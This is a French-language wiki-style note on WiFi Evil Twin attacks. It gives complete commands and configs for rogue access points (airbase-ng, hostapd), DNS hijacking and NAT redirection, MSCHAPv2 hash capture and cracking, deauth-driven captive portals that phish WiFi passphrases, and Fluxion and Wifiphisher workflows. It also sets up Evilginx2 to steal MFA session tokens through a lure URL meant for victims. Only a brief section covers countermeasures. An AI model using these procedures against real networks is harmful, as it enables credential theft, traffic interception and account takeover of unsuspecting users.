---
title: "Evil Twin et Phishing WiFi"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking > WiFi"
tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, evil-twin, fluxion, wifiphisher, mitm]
date: "2026-05-17"
---

# Evil Twin et Phishing WiFi

Principe : monter un AP rogue qui imite un réseau légitime, puis pousser les victimes à s'y connecter. Permet du **MITM passif** (interception), du **phishing actif** (captive portal) ou de la **capture de credentials** (WPA2-Enterprise).

## Architecture d'un Evil Twin

```
[Internet] ←→ [Carte 1 : uplink wlan1/eth0]
                      |
                 [hostapd + dnsmasq + iptables NAT]
                      |
              [Carte 2 : AP rogue wlan0]
                      |
                 [Victime trompée]
```

Deux cartes utiles : une pour héberger l'AP, une autre (ou ethernet) pour la sortie internet.

## airbase-ng — AP minimaliste

```bash
# AP ouvert avec SSID arbitraire
airbase-ng -e "Free WiFi" -c 6 wlan0mon
# Crée une interface at0 (tap virtuelle)

# Imiter un AP précis (mode Karma — répond à toutes les probes)
airbase-ng -P -C 60 wlan0mon
# -P = répondre aux probes (Karma)
# -C 60 = "broadcast" l'ESSID de chaque probe pendant 60s

# Cloner un AP existant (même BSSID + canal)
airbase-ng -a AA:BB:CC:DD:EE:FF -e "MaisonBox" -c 6 wlan0mon

# Configurer at0 pour le routing
ip addr add 10.0.0.1/24 dev at0
ip link set at0 up
```

## Stack DHCP + DNS + NAT

```bash
# 1. dnsmasq : DHCP + DNS hijack
cat > /tmp/dnsmasq.conf << EOF
interface=at0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1            # gateway
dhcp-option=6,10.0.0.1            # DNS
server=8.8.8.8
log-queries
log-dhcp
# Forcer toutes les résolutions vers nous (captive portal)
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/dnsmasq.conf -d

# 2. NAT pour donner internet aux victimes
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# 3. Rediriger HTTP vers notre portail (port 80 → 8080)
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

## hostapd — AP plus configurable

```bash
cat > /tmp/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=MaisonBox
hw_mode=g
channel=6
ieee80211n=1
# WPA2-PSK (optionnel — vide = ouvert)
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
hostapd /tmp/hostapd.conf
```

## hostapd-wpe — AP malveillant Enterprise

Cible WPA2-Enterprise (PEAP/EAP-TTLS). Capture les hashes MSCHAPv2.

```bash
# Préparer la conf
cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/wpe.conf
# Éditer ssid=Corporate-WiFi, channel=6

# Lancer
hostapd-wpe /tmp/wpe.conf

# Sortie quand un client se connecte :
# mschapv2: Wed Mar 22 ...
# username:  alice
# challenge: 11:22:33:44:55:66:77:88
# response:  AA:BB:CC...
# jtr NETNTLM: alice:$NETNTLM$11223344556677...

# Crack
hashcat -m 5500 hash.txt rockyou.txt
# Ou via asleap pour des PSK plus simples :
asleap -C challenge -R response -W rockyou.txt
```

Plus de détails → [[06 - Attaques WPA2-Enterprise]].

## Captive Portal — phishing de la PSK

Idée : la victime est déjà connectée à son vrai AP. On la **deauth en boucle** et on monte un AP ouvert avec le même SSID. Quand elle se reconnecte sur le rogue, un portail captif affiche "Votre routeur a besoin d'une mise à jour, ressaisissez votre mot de passe WiFi".

```
[Victime] ↔ [Vrai AP "MaisonBox"]  ← deauth en boucle (mdk4/aireplay)
                                          ↓
[Victime] ←→ [Faux AP ouvert "MaisonBox"]
                       ↓
              [Captive Portal HTTP/HTTPS]
                       ↓
              PSK saisie → vérifiée vs handshake capturé
```

Vérification : on a déjà capturé un handshake de la vraie AP. La PSK saisie est testée localement avec `aircrack-ng` — si elle valide, elle est correcte.

## Fluxion — Evil Twin + captive portal automatisé

Framework Bash interactif. Workflow complet :

```bash
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
sudo ./fluxion.sh -i

# Menu :
# 1. Select language → fr
# 2. Sélectionner l'interface (wlan0)
# 3. Sélectionner le canal à scanner (all/specific)
# 4. Sélectionner l'AP cible dans la liste
# 5. Choisir "Captive Portal Attack"
# 6. Choisir l'interface deauth (mdk4 recommandé)
# 7. Choisir l'interface pour l'AP rogue
# 8. Capturer ou fournir un handshake (sera utilisé pour valider la PSK)
# 9. Choisir le template de portail (Linksys, Netgear, FAI français...)
# 10. Lancer
```

Fluxion gère automatiquement :
- Deauth continue sur la vraie AP
- Démarrage du faux AP (hostapd + dnsmasq)
- Serveur HTTP avec le template choisi
- Validation côté serveur de la PSK saisie (via aircrack-ng sur le handshake)
- Arrêt propre quand la PSK est trouvée

## Wifiphisher — phishing multi-scénarios

Plus orienté collecte de credentials. Templates inclus pour différents scénarios.

```bash
git clone https://github.com/wifiphisher/wifiphisher
cd wifiphisher && python setup.py install

# Lancer avec scénario "firmware-upgrade"
wifiphisher -aI wlan0 -jI wlan1 \
  -p firmware-upgrade \
  -e "MaisonBox"

# Scénarios disponibles :
# - firmware-upgrade   : "Votre routeur doit être mis à jour"
# - oauth-login        : Page Google/Facebook OAuth
# - plugin_update      : "Mise à jour du navigateur"
# - browser_warning    : Faux warning sécurité Chrome/Firefox
# - wifi_connect       : "Saisissez votre mot de passe WiFi"
```

**Options clés** :

| Flag | Rôle |
|------|------|
| `-aI` | Interface pour l'AP rogue |
| `-jI` | Interface pour la deauth |
| `-eI` | Interface pour la sortie internet |
| `-p` | Template de phishing |
| `-e` | ESSID à imiter |
| `--essid` | ESSID custom (sans imitation) |
| `--noextensions` | Désactive deauth (juste l'AP) |

## Evilginx2 — vol de tokens MFA

Reverse proxy qui intercepte les sessions HTTPS authentifiées (cookies de session, tokens OAuth). Combiné avec un Evil Twin → bypass MFA.

```bash
# Phishlets pour Office365, Google, Github, etc.
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && make

# Lancer
./evilginx2

# Dans le prompt :
> config domain mondomaine.tld
> config ip 1.2.3.4
> phishlets hostname o365 login.mondomaine.tld
> phishlets enable o365
> lures create o365
> lures get-url 0
# → URL à diffuser aux victimes
```

À combiner avec un captive portal qui redirige vers cette URL.

## Détection / contre-mesures

- **PMF (802.11w)** : les paquets management sont signés → deauth refusés → Evil Twin sans deauth fonctionne moins bien
- **WPA3-SAE** : le client refuse de se connecter à un AP qui prétend être SAE mais ne sait pas faire SAE
- **Validation certificat serveur** côté client (WPA2-Enterprise) : refuse l'AP si certificat non signé par l'AC entreprise
- **WIDS** (Kismet, Aruba RFProtect, Cisco wIPS) : alerte sur les SSIDs dupliqués avec BSSID inconnu
- **Sensibilisation utilisateurs** : ne jamais ressaisir une PSK sur une page web

## Voir aussi

- [[06 - Attaques WPA2-Enterprise]] — hostapd-wpe en détail
- [[07 - DoS et MDK4]] — deauth de qualité avec mdk4
- [[08 - Frameworks Tout-en-Un]] — airgeddon intègre Evil Twin
- [[11 - Defense et Detection]] — WIDS et détection rogue AP
